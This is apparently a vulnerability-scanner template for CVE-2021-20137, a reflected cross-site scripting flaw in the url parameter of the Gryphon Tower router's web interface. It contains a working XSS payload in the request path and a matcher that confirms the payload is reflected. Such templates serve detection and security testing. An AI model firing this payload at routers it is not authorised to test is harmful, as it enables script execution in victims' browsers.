id: CVE-2021-20137

info:
  name: Reflected XSS in Gryphon Tower Web Interface
  author: dwisiswant0
  severity: medium
  description: |
    A reflected cross-site scripting vulnerability exists in the url
    parameter of the /cgi-bin/luci/site_access/ page on the Gryphon Tower
    router's web interface. An attacker could exploit this issue by tricking
    a user into following a specially crafted link, granting the attacker
    javascript execution in the context of the victim's browser.
  reference: https://www.tenable.com/security/research/tra-2021-51
  tags: cve,cve2021,xss,gryphon-tower

requests:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/luci/site_access/?url=%22{{url_encode(' onfocus=alert(document.domain) autofocus=1')}}"

    matchers:
      - type: word
        words:
          - "onfocus=alert(document.domain) autofocus=1"
